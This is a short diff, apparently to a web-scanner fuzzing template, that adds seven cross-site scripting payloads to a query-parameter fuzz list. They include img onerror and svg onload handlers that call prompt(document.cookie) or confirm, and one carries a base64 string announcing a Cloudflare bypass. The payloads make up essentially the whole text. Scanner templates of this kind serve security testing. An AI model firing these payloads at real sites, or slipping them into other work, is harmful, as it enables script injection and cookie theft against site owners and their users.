@@ -35,6 +35,13 @@ http:
         - "<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>"
         - "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E"
         - "'%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'"
+        - "<img src/onerror=prompt(document.cookie)>"
+        - "<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>"
+        - "><img src=x onerror=prompt(document.domain)>"
+        - "><img src=x onerror=prompt(document.domain)>"
+        - "><svg/onload=alert(1)>" 
+        - "<Img Src=OnXSS OnError=confirm(1337)>" 
+        - "<svg/onload=confirm(1)>" 
 
     fuzzing:
       - part: query
